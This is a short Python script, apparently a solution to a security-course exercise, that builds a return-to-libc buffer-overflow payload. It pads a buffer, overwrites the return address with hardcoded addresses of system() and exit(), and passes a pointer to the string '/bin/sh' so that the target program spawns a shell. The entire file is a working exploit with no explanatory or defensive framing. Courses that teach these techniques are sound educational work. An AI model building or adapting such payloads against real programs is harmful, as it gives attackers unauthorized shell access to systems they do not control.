import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
exit_addr = pack('<I', 0x0807a064)
system_addr = pack('<I', 0x08051950)
buf_add = pack('<I', 0xfff6ef36 + 34)
padding =  b'A' * (22)

payload = padding  +   system_addr + exit_addr +  buf_add +  b'/bin/sh'

# Launch the attack!
sys.stdout.buffer.write(payload)
